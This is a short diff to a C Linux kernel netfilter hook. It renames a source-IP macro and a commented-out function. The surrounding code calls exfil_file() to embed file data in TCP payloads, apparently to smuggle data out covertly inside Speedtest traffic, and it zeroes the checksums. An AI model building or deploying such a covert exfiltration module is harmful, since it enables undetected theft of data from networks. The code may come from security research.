@@ -116,7 +116,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 
 	//convert source IP to bytes
 	__be32 source_ip;
-	char ip_source[] = IP_SOURCE;
+	char ip_source[] = SOURCE_IP;
 	__be32 client_ip = in_aton(ip_source);
 
 	//check if packet is valid
@@ -173,7 +173,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
         exfil_file(skb, tcp_payloadoffset);
 
 		//call function that overwrites entire TCP payload with random bytes and calculates the max amount of bytes that can be exfiled in a single Speedtest
-        //max_exfiled_bytes(skb, tcp_payloadoffset, tcp_payloadlen);
+        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);
        
         //zero out checksum
         tcp_header->check = 0;
